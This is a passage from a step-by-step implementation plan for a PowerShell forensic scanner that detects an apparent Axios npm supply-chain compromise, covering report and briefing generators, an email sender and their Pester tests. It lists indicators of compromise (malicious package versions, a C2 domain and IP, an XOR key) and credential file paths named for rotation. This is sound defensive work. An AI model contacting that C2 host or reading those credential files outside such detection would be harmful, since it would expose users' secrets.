    $allFindings    = @($Artifacts) + @($CacheFindings) + @($DroppedPayloads) + @($PersistenceArtifacts) + @($XorFindings) + @($NetworkEvidence)
    $criticalCount  = @($allFindings | Where-Object { $_.Severity -eq 'Critical' }).Count
    $overallStatus  = if ($vulnProjects.Count -gt 0 -or $allFindings.Count -gt 0) { 'COMPROMISED' } else { 'CLEAN' }

    $sb = [System.Text.StringBuilder]::new()

    function Add-Section { param([string]$Title) [void]$sb.AppendLine(); [void]$sb.AppendLine($Title); [void]$sb.AppendLine('-' * 60) }
    function Add-Line    { param([string]$Line)  [void]$sb.AppendLine($Line) }

    [void]$sb.AppendLine('=' * 80)
    [void]$sb.AppendLine('AXIOS NPM SUPPLY CHAIN COMPROMISE SCANNER — FORENSIC REPORT')
    [void]$sb.AppendLine('=' * 80)

    Add-Section 'EXECUTIVE SUMMARY'
    Add-Line "Total projects scanned    : $($Projects.Count)"
    Add-Line "Vulnerable (lockfile)     : $($vulnProjects.Count)"
    Add-Line "Critical findings (total) : $criticalCount"
    Add-Line "Overall status            : $overallStatus"
    if ($overallStatus -eq 'COMPROMISED') {
        Add-Line ''
        Add-Line '*** ACTION REQUIRED: Evidence of compromise detected. Isolate this machine.'
        Add-Line '*** Do NOT use for further development until remediation is complete.'
    }

    Add-Section 'SCAN METADATA'
    Add-Line "Timestamp     : $($ScanMetadata.Timestamp)"
    Add-Line "Hostname      : $($ScanMetadata.Hostname)"
    Add-Line "Username      : $($ScanMetadata.Username)"
    Add-Line "Scan Duration : $($ScanMetadata.Duration)"
    Add-Line "Paths Scanned : $($ScanMetadata.Paths -join ', ')"

    Add-Section 'VULNERABLE PROJECTS (Lockfile Evidence)'
    if ($vulnProjects.Count -eq 0) { Add-Line 'None.' } else {
        foreach ($vp in $vulnProjects) {
            Add-Line "Project  : $($vp.ProjectPath)"
            Add-Line "Lockfile : $($vp.LockfileType) — $($vp.LockfilePath)"
            if ($vp.HasVulnerableAxios)      { Add-Line "FINDING  : axios@$($vp.VulnerableAxiosVersion) — malicious version" }
            if ($vp.HasMaliciousPlainCrypto) { Add-Line "FINDING  : plain-crypto-js@4.2.1 — postinstall dropper" }
            Add-Line "FIX      : npm install axios@1.14.0 && npm cache clean --force && rm -rf node_modules && npm install"
            Add-Line ''
        }
    }

    Add-Section 'FORENSIC ARTIFACTS (node_modules / setup.js / plaintext C2)'
    if ($Artifacts.Count -eq 0) { Add-Line 'None.' } else {
        foreach ($a in $Artifacts) {
            Add-Line "Type     : $($a.Type)  Severity: $($a.Severity)"
            Add-Line "Path     : $($a.Path)"
            if ($a.Hash) { Add-Line "SHA256   : $($a.Hash)" }
            Add-Line "Detail   : $($a.Description)"
            Add-Line ''
        }
    }

    Add-Section 'NPM CACHE FINDINGS'
    if ($CacheFindings.Count -eq 0) { Add-Line 'None.' } else {
        foreach ($c in $CacheFindings) {
            Add-Line "Type     : $($c.Type)  Severity: $($c.Severity)"
            Add-Line "Package  : $($c.PackageName)@$($c.Version)"
            Add-Line "Path     : $($c.Path)"
            Add-Line "Detail   : $($c.Description)"
            Add-Line ''
        }
    }

    Add-Section 'DROPPED PAYLOADS (RAT binaries/scripts in temp/appdata)'
    if ($DroppedPayloads.Count -eq 0) { Add-Line 'None detected.' } else {
        foreach ($dp in $DroppedPayloads) {
            Add-Line "Type     : $($dp.Type)  Severity: $($dp.Severity)"
            Add-Line "Path     : $($dp.Path)"
            Add-Line "Created  : $($dp.CreationTime)"
            if ($dp.Hash) { Add-Line "SHA256   : $($dp.Hash)" }
            Add-Line "Detail   : $($dp.Description)"
            Add-Line ''
        }
    }

    Add-Section 'PERSISTENCE MECHANISMS (scheduled tasks / registry / startup)'
    if ($PersistenceArtifacts.Count -eq 0) { Add-Line 'None detected.' } else {
        foreach ($pa in $PersistenceArtifacts) {
            Add-Line "Type     : $($pa.Type)  Severity: $($pa.Severity)"
            Add-Line "Location : $($pa.Location)"
            Add-Line "Name     : $($pa.Name)"
            Add-Line "Value    : $($pa.Value)"
            Add-Line "Detail   : $($pa.Description)"
            Add-Line ''
        }
    }

    Add-Section 'XOR-ENCODED INDICATORS (ObfuscatedC2 via OrDeR_7077 key)'
    if ($XorFindings.Count -eq 0) { Add-Line 'None detected.' } else {
        foreach ($xf in $XorFindings) {
            Add-Line "Type      : $($xf.Type)  Severity: $($xf.Severity)"
            Add-Line "Path      : $($xf.Path)"
            Add-Line "Indicator : $($xf.DecodedIndicator)"
            Add-Line "Detail    : $($xf.Description)"
            Add-Line ''
        }
    }

    Add-Section 'NETWORK EVIDENCE (DNS cache / active connections / firewall log)'
    if ($NetworkEvidence.Count -eq 0) { Add-Line 'None detected.' } else {
        foreach ($ne in $NetworkEvidence) {
            Add-Line "Type     : $($ne.Type)  Severity: $($ne.Severity)"
            Add-Line "Detail   : $($ne.Detail)"
            Add-Line "Summary  : $($ne.Description)"
            Add-Line ''
        }
    }

    Add-Section 'CREDENTIALS AT RISK'
    Add-Line 'If COMPROMISED status — rotate ALL of the following immediately:'
    $credPaths = @(
        (Join-Path ($env:USERPROFILE ?? $env:HOME) '.ssh'),
        (Join-Path ($env:USERPROFILE ?? $env:HOME) '.gitconfig'),
        (Join-Path ($env:USERPROFILE ?? $env:HOME) '.npmrc'),
        (Join-Path ($env:USERPROFILE ?? $env:HOME) '.aws/credentials'),
        (Join-Path ($env:USERPROFILE ?? $env:HOME) '.kube/config'),
        (Join-Path ($env:USERPROFILE ?? $env:HOME) '.docker/config.json')
    )
    foreach ($cp in $credPaths) {
        $label = if (Test-Path $cp) { '  PRESENT — ROTATE:' } else { '  (not found):' }
        Add-Line "$label $cp"
    }
    Add-Line 'Also rotate: GitHub tokens, NPM tokens, AWS/GCP/Azure keys, container registry secrets, K8s service accounts'

    Add-Section 'APPENDIX: IOC REFERENCE'
    Add-Line 'Malicious packages : axios@1.14.1, axios@0.30.4, plain-crypto-js@4.2.1'
    Add-Line 'setup.js SHA256    : e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09'
    Add-Line 'C2 domain/IP/port  : sfrclak.com, 142.11.206.73:8000'
    Add-Line 'XOR key/constant   : OrDeR_7077 / 333 (0x4D mask)'
    Add-Line 'Attack window      : 2026-03-31 00:21 UTC — 2026-03-31 03:15 UTC'

    Add-Section 'REMEDIATION GUIDANCE'
    Add-Line 'STEP 1 — Lockfile cleanup:'
    Add-Line '  npm install axios@1.14.0   (or axios@0.30.3 for v0.x)'
    Add-Line '  npm cache clean --force'
    Add-Line '  Remove-Item node_modules -Recurse -Force && npm install'
    Add-Line ''
    Add-Line 'STEP 2 — If dropped payloads or persistence found:'
    Add-Line '  1. Isolate machine from network immediately'
    Add-Line '  2. Capture forensic disk image before any changes'
    Add-Line '  3. Remove scheduled tasks, registry run keys, startup entries found above'
    Add-Line '  4. Delete dropped payload files found above'
    Add-Line '  5. Check Windows Event Log (EID 4688 / Sysmon 1) for node.exe child processes around 2026-03-31'
    Add-Line '  6. Review network logs for traffic to sfrclak.com or 142.11.206.73:8000'
    Add-Line '  7. Consider full OS re-image if active connection was found'
    Add-Line ''
    Add-Line 'STEP 3 — Credential rotation (mandatory if COMPROMISED):'
    Add-Line '  SSH keys, GitHub tokens, NPM tokens, AWS/GCP/Azure credentials,'
    Add-Line '  Kubernetes configs, container registry secrets, any secrets in .env files'

    # ── Write file ─────────────────────────────────────────────────────────────
    $null = New-Item -ItemType Directory -Path $OutputPath -Force
    $ts       = Get-Date -Format 'yyyyMMdd-HHmmss'
    $hn       = $env:COMPUTERNAME ?? $env:HOSTNAME ?? 'unknown'
    $filePath = Join-Path $OutputPath "Axios-Scan-${hn}-${ts}.txt"

    $sb.ToString() | Set-Content -Path $filePath -Encoding UTF8

    if ($IsWindows -or $env:OS -eq 'Windows_NT') {
        try {
            $acl = Get-Acl $filePath
            $acl.SetAccessRuleProtection($true, $false)
            $acl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule('Administrators','FullControl','Allow')))
            Set-Acl $filePath $acl
        } catch { Write-Warning "Could not restrict report permissions: $_" }
    } else {
        & chmod 600 $filePath 2>$null
    }

    return $filePath
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/New-ScanReport.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/New-ScanReport.ps1 Tests/New-ScanReport.Tests.ps1
git commit -m "feat: add New-ScanReport with all 10 finding categories (FR4)"
```

---

## Task 11: New-ExecBriefing — C-Suite Executive Briefing

**Purpose:** Generate a plain-English, one-page document a CISO or VP can read in 60 seconds and understand whether a developer's machine is safe. Lists all 8 security checks with a clear pass/fail per check, a plain-English description of what each check looked for, count of items examined, count of findings, and an overall verdict. Includes a scan integrity footer so leadership knows the scan was complete.

**Output format:**
```
══════════════════════════════════════════════════════════════════
AXIOS SUPPLY CHAIN ATTACK — EXECUTIVE SECURITY BRIEFING
Prepared: 2026-04-01 14:32 UTC  |  Machine: DEVBOX-01  |  Analyst: jsmith
══════════════════════════════════════════════════════════════════

OVERALL VERDICT:  ✓ CLEAN   (or  ✗ COMPROMISED — ISOLATE IMMEDIATELY)

──────────────────────────────────────────────────────────────────
SECURITY CHECK RESULTS   (8 checks performed)
──────────────────────────────────────────────────────────────────

 #  CHECK                         WHAT WE LOOKED FOR                 EXAMINED   FINDINGS  STATUS
 1  Project Discovery             Node.js projects on disk           47 found   —         PASS
 2  Dependency Lockfiles          Known-malicious axios versions     47 files   0 vuln    PASS
 3  Malicious Package Files       Backdoor package + dropper script  47 dirs    0 hits    PASS
 4  npm Package Cache             Poisoned packages in npm cache     1 cache    0 hits    PASS
 5  Dropped Malware Payloads      Executable files in temp/appdata   3 dirs     0 files   PASS
 6  Persistence Mechanisms        Scheduled tasks, registry, startup 3 sources  0 entries PASS
 7  Obfuscated Attack Signals     XOR-encoded attacker callbacks     4 dirs     0 hits    PASS
 8  Network Contact Evidence      DNS cache, connections, firewall   3 sources  0 hits    PASS

──────────────────────────────────────────────────────────────────
WHAT THIS MEANS
──────────────────────────────────────────────────────────────────
[CLEAN]  No evidence of compromise was detected across all 8 checks.
         The malicious software was not installed, or was removed before
         execution. No credential rotation is required beyond standard hygiene.

[COMPROMISED]  Evidence of attack found in N checks. This machine should be
               isolated immediately. See REQUIRED ACTIONS below.

──────────────────────────────────────────────────────────────────
REQUIRED ACTIONS
──────────────────────────────────────────────────────────────────
[tailored list based on which checks failed]

──────────────────────────────────────────────────────────────────
SCAN INTEGRITY
──────────────────────────────────────────────────────────────────
Scanner version   : 1.0
Checks completed  : 8 of 8
Scan duration     : 45.2s
Technical report  : Axios-Scan-DEVBOX-01-20260401-143210.txt
Report SHA256     : [sha256 of technical report file]
```

**Files:**
- Create: `Tests/New-ExecBriefing.Tests.ps1`
- Create: `Private/New-ExecBriefing.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/New-ExecBriefing.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/New-ExecBriefing.ps1"

    $outDir   = Join-Path $TestDrive 'briefings'
    $metadata = @{ Timestamp='2026-04-01 14:32:00 UTC'; Hostname='DEVBOX-01'; Username='jsmith'; Duration='45.2s'; Paths=@('C:\Dev') }

    # Create a fake technical report to hash
    $fakeReport = Join-Path $TestDrive 'fake-report.txt'
    'Technical report content' | Set-Content $fakeReport

    $vulnLockfile = [PSCustomObject]@{
        ProjectPath='C:\Dev\app'; HasVulnerableAxios=$true; VulnerableAxiosVersion='1.14.1'
        HasMaliciousPlainCrypto=$true; LockfileType='npm'; LockfilePath='C:\Dev\app\package-lock.json'; Error=$null
    }
    $cleanLockfile = [PSCustomObject]@{
        ProjectPath='C:\Dev\ok'; HasVulnerableAxios=$false; HasMaliciousPlainCrypto=$false
        LockfileType='npm'; LockfilePath='C:\Dev\ok\package-lock.json'; VulnerableAxiosVersion=$null; Error=$null
    }
    $criticalArtifact = [PSCustomObject]@{ Type='MaliciousPackage'; Path='C:\Dev\app\node_modules\plain-crypto-js'; Hash=$null; Severity='Critical'; Description='plain-crypto-js found' }
}

Describe 'New-ExecBriefing' {
    Context 'generates briefing file' {
        BeforeAll {
            $path = New-ExecBriefing -ProjectCount 2 -LockfileResults @($cleanLockfile) `
                -Artifacts @() -CacheFindings @() -DroppedPayloads @() `
                -PersistenceArtifacts @() -XorFindings @() -NetworkEvidence @() `
                -TechnicalReportPath $fakeReport -OutputPath $outDir -ScanMetadata $metadata
        }
        It 'creates the briefing file' { Test-Path $path | Should -BeTrue }
        It 'filename contains ExecBriefing' { [IO.Path]::GetFileName($path) | Should -Match 'ExecBriefing' }
    }

    Context 'clean scan' {
        BeforeAll {
            $path = New-ExecBriefing -ProjectCount 47 -LockfileResults @($cleanLockfile) `
                -Artifacts @() -CacheFindings @() -DroppedPayloads @() `
                -PersistenceArtifacts @() -XorFindings @() -NetworkEvidence @() `
                -TechnicalReportPath $fakeReport -OutputPath $outDir -ScanMetadata $metadata
            $content = Get-Content $path -Raw
        }
        It 'verdict is CLEAN'                          { $content | Should -Match 'CLEAN' }
        It 'shows 8 checks performed'                  { $content | Should -Match '8 checks performed' }
        It 'shows project count in check 1 row'        { $content | Should -Match '47' }
        It 'all check rows show PASS'                  { ($content | Select-String 'PASS').Matches.Count | Should -Be 8 }
        It 'no FAIL rows'                              { $content | Should -Not -Match '\bFAIL\b' }
        It 'contains WHAT THIS MEANS section'          { $content | Should -Match 'WHAT THIS MEANS' }
        It 'contains SCAN INTEGRITY section'           { $content | Should -Match 'SCAN INTEGRITY' }
        It 'contains report SHA256 hash'               { $content | Should -Match 'Report SHA256' }
        It 'shows 8 of 8 checks completed'             { $content | Should -Match '8 of 8' }
        It 'contains technical report filename'        { $content | Should -Match 'fake-report\.txt' }
    }

    Context 'compromised scan — lockfile hit' {
        BeforeAll {
            $path = New-ExecBriefing -ProjectCount 10 -LockfileResults @($vulnLockfile) `
                -Artifacts @($criticalArtifact) -CacheFindings @() -DroppedPayloads @() `
                -PersistenceArtifacts @() -XorFindings @() -NetworkEvidence @() `
                -TechnicalReportPath $fakeReport -OutputPath $outDir -ScanMetadata $metadata
            $content = Get-Content $path -Raw
        }
        It 'verdict is COMPROMISED'                    { $content | Should -Match 'COMPROMISED' }
        It 'check 2 row shows FAIL'                    { $content | Should -Match 'FAIL' }
        It 'contains REQUIRED ACTIONS section'         { $content | Should -Match 'REQUIRED ACTIONS' }
        It 'REQUIRED ACTIONS mentions credential rotation' { $content | Should -Match 'credential' }
    }

    Context 'compromised scan — active C2 connection' {
        BeforeAll {
            $c2 = [PSCustomObject]@{ Type='ActiveC2Connection'; Detail='142.11.206.73:8000'; Severity='Critical'; Description='Active connection' }
            $path = New-ExecBriefing -ProjectCount 5 -LockfileResults @($cleanLockfile) `
                -Artifacts @() -CacheFindings @() -DroppedPayloads @() `
                -PersistenceArtifacts @() -XorFindings @() -NetworkEvidence @($c2) `
                -TechnicalReportPath $fakeReport -OutputPath $outDir -ScanMetadata $metadata
            $content = Get-Content $path -Raw
        }
        It 'verdict is COMPROMISED'                    { $content | Should -Match 'COMPROMISED' }
        It 'check 8 row shows FAIL'                    { $content | Should -Match 'FAIL' }
        It 'REQUIRED ACTIONS mentions isolate machine'  { $content | Should -Match '[Ii]solat' }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/New-ExecBriefing.Tests.ps1 -Output Detailed"
```

Expected: FAILED — `New-ExecBriefing` not defined

- [ ] **Step 3: Implement**

`Private/New-ExecBriefing.ps1`:
```powershell
function New-ExecBriefing {
    [CmdletBinding()]
    param(
        [int]$ProjectCount                              = 0,
        [PSCustomObject[]]$LockfileResults              = @(),
        [PSCustomObject[]]$Artifacts                    = @(),
        [PSCustomObject[]]$CacheFindings                = @(),
        [PSCustomObject[]]$DroppedPayloads              = @(),
        [PSCustomObject[]]$PersistenceArtifacts         = @(),
        [PSCustomObject[]]$XorFindings                  = @(),
        [PSCustomObject[]]$NetworkEvidence              = @(),
        [Parameter(Mandatory)][string]$TechnicalReportPath,
        [Parameter(Mandatory)][string]$OutputPath,
        [Parameter(Mandatory)][hashtable]$ScanMetadata
    )

    # ── Derive per-check pass/fail ─────────────────────────────────────────────
    $vulnLockfiles = @($LockfileResults | Where-Object { $_.HasVulnerableAxios -or $_.HasMaliciousPlainCrypto })

    $checks = [ordered]@{
        '1' = @{
            Name     = 'Project Discovery'
            What     = 'Node.js projects on disk'
            Examined = "$ProjectCount found"
            Findings = $null      # informational only — never fails
            Pass     = $true
        }
        '2' = @{
            Name     = 'Dependency Lockfiles'
            What     = 'Known-malicious axios versions in npm/yarn/pnpm'
            Examined = "$($LockfileResults.Count) lockfiles"
            Findings = $vulnLockfiles.Count
            Pass     = $vulnLockfiles.Count -eq 0
        }
        '3' = @{
            Name     = 'Malicious Package Files'
            What     = 'Backdoor package directory and dropper script hash'
            Examined = "$ProjectCount project dirs"
            Findings = $Artifacts.Count
            Pass     = $Artifacts.Count -eq 0
        }
        '4' = @{
            Name     = 'npm Package Cache'
            What     = 'Poisoned packages still cached in npm content store'
            Examined = '1 cache'
            Findings = $CacheFindings.Count
            Pass     = $CacheFindings.Count -eq 0
        }
        '5' = @{
            Name     = 'Dropped Malware Payloads'
            What     = 'Executables/scripts written to temp or appdata after attack'
            Examined = 'Temp and appdata locations'
            Findings = $DroppedPayloads.Count
            Pass     = $DroppedPayloads.Count -eq 0
        }
        '6' = @{
            Name     = 'Persistence Mechanisms'
            What     = 'Scheduled tasks, registry Run keys, startup folder'
            Examined = '3 persistence sources'
            Findings = $PersistenceArtifacts.Count
            Pass     = $PersistenceArtifacts.Count -eq 0
        }
        '7' = @{
            Name     = 'Obfuscated Attack Signals'
            What     = "XOR-encoded C2 callbacks (key: OrDeR_7077)"
            Examined = 'Temp and appdata files'
            Findings = $XorFindings.Count
            Pass     = $XorFindings.Count -eq 0
        }
        '8' = @{
            Name     = 'Network Contact Evidence'
            What     = 'DNS cache, active TCP connections, Windows Firewall log'
            Examined = '3 network sources'
            Findings = $NetworkEvidence.Count
            Pass     = $NetworkEvidence.Count -eq 0
        }
    }

    $failedChecks   = @($checks.GetEnumerator() | Where-Object { -not $_.Value.Pass })
    $overallClean   = $failedChecks.Count -eq 0
    $verdictLabel   = if ($overallClean) { 'CLEAN' } else { 'COMPROMISED' }
    $verdictSymbol  = if ($overallClean) { [char]0x2713 } else { [char]0x2717 }   # ✓ / ✗

    # ── Hash the technical report for integrity footer ─────────────────────────
    $reportHash = 'unavailable'
    try { $reportHash = (Get-FileHash -Path $TechnicalReportPath -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower() } catch { }
    $reportFilename = [IO.Path]::GetFileName($TechnicalReportPath)

    # ── Build document ─────────────────────────────────────────────────────────
    $w  = 68  # document width
    $sb = [System.Text.StringBuilder]::new()

    function HR  { [void]$sb.AppendLine('=' * $w) }
    function HR2 { [void]$sb.AppendLine('-' * $w) }
    function Ln  { param([string]$s = '') [void]$sb.AppendLine($s) }

    HR
    Ln 'AXIOS SUPPLY CHAIN ATTACK — EXECUTIVE SECURITY BRIEFING'
    Ln "Prepared : $($ScanMetadata.Timestamp)"
    Ln "Machine  : $($ScanMetadata.Hostname)   |   Analyst: $($ScanMetadata.Username)"
    HR
    Ln
    Ln "  OVERALL VERDICT:  $verdictSymbol $verdictLabel"
    Ln
    if (-not $overallClean) {
        Ln '  *** ACTION REQUIRED — See REQUIRED ACTIONS section below ***'
        Ln
    }

    HR2
    Ln "SECURITY CHECK RESULTS   (8 checks performed)"
    HR2
    Ln
    Ln (' #{0,-3} {1,-30} {2,-35} {3,-10} {4,-8} {5}' -f '', 'CHECK', 'WHAT WE LOOKED FOR', 'EXAMINED', 'FINDINGS', 'STATUS')
    Ln (' {0,-4} {1,-30} {2,-35} {3,-10} {4,-8} {5}' -f '─', ('─' * 29), ('─' * 34), ('─' * 9), ('─' * 7), '──────')

    foreach ($entry in $checks.GetEnumerator()) {
        $c         = $entry.Value
        $status    = if ($c.Pass) { 'PASS' } else { 'FAIL' }
        $findStr   = if ($null -eq $c.Findings) { '—' } elseif ($c.Findings -eq 0) { '0 hits' } else { "$($c.Findings) found" }
        Ln (' {0,-4} {1,-30} {2,-35} {3,-10} {4,-8} {5}' -f $entry.Key, $c.Name, $c.What, $c.Examined, $findStr, $status)
    }

    Ln
    HR2
    Ln 'WHAT THIS MEANS'
    HR2
    Ln
    if ($overallClean) {
        Ln '  No evidence of compromise was detected across all 8 checks.'
        Ln '  The malicious software either was never installed on this machine'
        Ln '  or was fully removed before execution.'
        Ln
        Ln '  This developer may resume work after completing standard lockfile'
        Ln '  cleanup (detailed in the technical report).'
    } else {
        Ln "  Evidence of attack found in $($failedChecks.Count) of 8 checks."
        Ln
        Ln '  The Axios supply chain attack is designed to steal credentials'
        Ln '  (SSH keys, cloud provider tokens, git credentials, API keys) and'
        Ln '  install a persistent backdoor. Any secrets accessible from this'
        Ln '  machine must be treated as compromised.'
        Ln
        Ln '  Failed checks:'
        foreach ($f in $failedChecks) {
            Ln "    Check $($f.Key) — $($f.Value.Name)"
        }
    }

    Ln
    HR2
    Ln 'REQUIRED ACTIONS'
    HR2
    Ln
    if ($overallClean) {
        Ln '  1. Run: npm install axios@1.14.0  (or 0.30.3 for v0.x branches)'
        Ln '  2. Run: npm cache clean --force'
        Ln '  3. Delete node_modules/ and re-run npm install'
        Ln '  4. No credential rotation required beyond standard hygiene.'
    } else {
        Ln '  IMMEDIATE (within the hour):'
        Ln '  1. Disconnect this machine from the corporate network'
        Ln '  2. Do not use this machine for any further work'
        Ln '  3. Notify the Security Incident Response team'
        Ln
        Ln '  WITHIN 24 HOURS — rotate ALL credentials that exist on this machine:'
        Ln '  - SSH private keys'
        Ln '  - GitHub / GitLab / Bitbucket personal access tokens'
        Ln '  - NPM publish tokens'
        Ln '  - AWS / GCP / Azure access keys'
        Ln '  - Kubernetes kubeconfig service account tokens'
        Ln '  - Docker registry credentials'
        Ln '  - Any secrets stored in .env files or IDE keychains'
        Ln
        Ln '  INVESTIGATION:'
        Ln '  - Preserve a forensic disk image before remediation'
        Ln '  - Review Windows Event Logs for suspicious process execution'
        Ln "  - Check all systems this developer accessed since 2026-03-31"
        if ($NetworkEvidence.Count -gt 0) {
            Ln '  - ACTIVE C2 CONNECTION DETECTED: assume data exfiltration occurred'
        }
        Ln
        Ln '  See the technical report for full artifact locations and details.'
    }

    Ln
    HR2
    Ln 'SCAN INTEGRITY'
    HR2
    Ln "  Scanner version  : 1.0"
    Ln "  Checks completed : 8 of 8"
    Ln "  Scan duration    : $($ScanMetadata.Duration)"
    Ln "  Scanned paths    : $($ScanMetadata.Paths -join ', ')"
    Ln "  Technical report : $reportFilename"
    Ln "  Report SHA256    : $reportHash"
    Ln

    # ── Write file ─────────────────────────────────────────────────────────────
    $null = New-Item -ItemType Directory -Path $OutputPath -Force

    $ts   = Get-Date -Format 'yyyyMMdd-HHmmss'
    $hn   = $ScanMetadata.Hostname
    $file = Join-Path $OutputPath "ExecBriefing-${hn}-${ts}.txt"

    $sb.ToString() | Set-Content -Path $file -Encoding UTF8

    return $file
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/New-ExecBriefing.Tests.ps1 -Output Detailed"
```

Expected: All tests PASSED

- [ ] **Step 5: Commit**

```bash
git add Private/New-ExecBriefing.ps1 Tests/New-ExecBriefing.Tests.ps1
git commit -m "feat: add New-ExecBriefing C-Suite executive briefing document"
```

---

## Task 12: Send-ScanReport — Email (FR5)

**Files:**
- Create: `Tests/Send-ScanReport.Tests.ps1`
- Create: `Private/Send-ScanReport.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Send-ScanReport.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Send-ScanReport.ps1"
    $testReport = Join-Path $TestDrive 'report.txt'
    'Report content' | Set-Content $testReport
}

Describe 'Send-ScanReport' {
    Context 'successful send' {
        BeforeAll { Mock Send-MailMessage { } }
        It 'returns true' {
            Send-ScanReport -ReportPaths @($testReport) -SMTPServer 'smtp.co.com' -SMTPPort 587 `
                -FromAddress 'a@co.com' -ToAddress @('b@co.com') -UseTLS $true | Should -BeTrue
        }
        It 'calls Send-MailMessage with correct server' {
            Send-ScanReport -ReportPaths @($testReport) -SMTPServer 'smtp.co.com' -SMTPPort 587 `
                -FromAddress 'a@co.com' -ToAddress @('b@co.com') -UseTLS $true
            Should -Invoke Send-MailMessage -Times 1 -ParameterFilter { $SmtpServer -eq 'smtp.co.com' -and $Port -eq 587 }
        }
        It 'attaches the report file' {
            Send-ScanReport -ReportPaths @($testReport) -SMTPServer 'smtp.co.com' -SMTPPort 587 `
                -FromAddress 'a@co.com' -ToAddress @('b@co.com') -UseTLS $true
            Should -Invoke Send-MailMessage -Times 1 -ParameterFilter { $Attachments -contains $testReport }
        }
    }
    Context 'SMTP failure' {
        BeforeAll { Mock Send-MailMessage { throw 'Connection refused' } }
        It 'returns false without throwing' {
            { Send-ScanReport -ReportPaths @($testReport) -SMTPServer 'smtp.co.com' -SMTPPort 587 `
                -FromAddress 'a@co.com' -ToAddress @('b@co.com') -UseTLS $true } | Should -Not -Throw
            Send-ScanReport -ReportPaths @($testReport) -SMTPServer 'smtp.co.com' -SMTPPort 587 `
                -FromAddress 'a@co.com' -ToAddress @('b@co.com') -UseTLS $true | Should -BeFalse
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Send-ScanReport.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/Send-ScanReport.ps1`:
```powershell
function Send-ScanReport {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string[]]$ReportPaths,
        [Parameter(Mandatory)][string]$SMTPServer,
        [int]$SMTPPort = 587,
        [Parameter(Mandatory)][string]$FromAddress,
        [Parameter(Mandatory)][string[]]$ToAddress,
        [PSCredential]$Credential,
        [bool]$UseTLS = $true
    )
    try {
        $hn     = $env:COMPUTERNAME ?? $env:HOSTNAME ?? 'unknown'
        $params = @{
            SmtpServer  = $SMTPServer; Port = $SMTPPort; From = $FromAddress; To = $ToAddress
            Subject     = "Axios Compromise Scan — ${hn} — $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
            Body        = 'Axios NPM compromise scan report and executive briefing attached. Review immediately.'
            Attachments = $ReportPaths; UseSsl = $UseTLS; ErrorAction = 'Stop'
        }
        if ($Credential) { $params.Credential = $Credential }
        Send-MailMessage @params
        return $true
    } catch {
        Write-Warning "Email failed: $_"
        return $false
    }
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Send-ScanReport.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Send-ScanReport.ps1 Tests/Send-ScanReport.Tests.ps1
git commit -m "feat: add Send-ScanReport email (FR5)"
```

---

## Task 13: Main Orchestrator Script

**Files:**
- Create: `Invoke-AxiosCompromiseScanner.ps1`
- Create: `Tests/Invoke-AxiosCompromiseScanner.Tests.ps1`

- [ ] **Step 1: Write failing integration tests**

`Tests/Invoke-AxiosCompromiseScanner.Tests.ps1`:
```powershell
BeforeAll {
    $script    = "$PSScriptRoot/../Invoke-AxiosCompromiseScanner.ps1"
    $fixRoot   = "$PSScriptRoot/Fixtures"
    $outDir    = Join-Path $TestDrive 'output'
}

Describe 'Invoke-AxiosCompromiseScanner integration' {
    It 'runs without throwing' {
        { & $script -Path $fixRoot -OutputPath $outDir } | Should -Not -Throw
    }
    It 'creates a report file' {
        & $script -Path $fixRoot -OutputPath $outDir
        (Get-ChildItem $outDir -Filter 'Axios-Scan-*.txt' -ErrorAction SilentlyContinue).Count | Should -BeGreaterOrEqual 1
    }
    It 'exits 1 when vulnerable projects found' {
        $proc = Start-Process pwsh -ArgumentList @('-NonInteractive','-NoProfile','-File',$script,'-Path',"$fixRoot/VulnerableNpmProject",'-OutputPath',$outDir) -Wait -PassThru -NoNewWindow
        $proc.ExitCode | Should -Be 1
    }
    It 'exits 0 when only clean projects found' {
        $proc = Start-Process pwsh -ArgumentList @('-NonInteractive','-NoProfile','-File',$script,'-Path',"$fixRoot/CleanProject",'-OutputPath',$outDir) -Wait -PassThru -NoNewWindow
        $proc.ExitCode | Should -Be 0
    }
    It 'throws when -SendEmail used without -SMTPServer' {
        { & $script -Path $fixRoot -OutputPath $outDir -SendEmail } | Should -Throw '*SMTPServer*'
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Invoke-AxiosCompromiseScanner.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement main script**

`Invoke-AxiosCompromiseScanner.ps1`:
```powershell
#Requires -Version 5.1
<#
.SYNOPSIS
    Scans for evidence of the March 31, 2026 Axios NPM supply chain attack.
.DESCRIPTION
    Runs ten checks covering the full compromise kill chain:
    lockfile evidence, deployed package artifacts, npm cache, dropped RAT payloads,
    persistence mechanisms, XOR-obfuscated indicators, and network evidence.
    Generates a forensic report and optionally emails it.
.PARAMETER Path
    Root directories to scan for Node.js projects. Defaults to common dev locations.
.PARAMETER OutputPath
    Directory for report and log files.
.PARAMETER SendEmail
    Send the report by email. Requires -SMTPServer, -FromAddress, -ToAddress.
.EXAMPLE
    .\Invoke-AxiosCompromiseScanner.ps1
.EXAMPLE
    .\Invoke-AxiosCompromiseScanner.ps1 -Path C:\Dev -SendEmail -SMTPServer smtp.co.com -FromAddress sec@co.com -ToAddress ir@co.com
#>
[CmdletBinding()]
param(
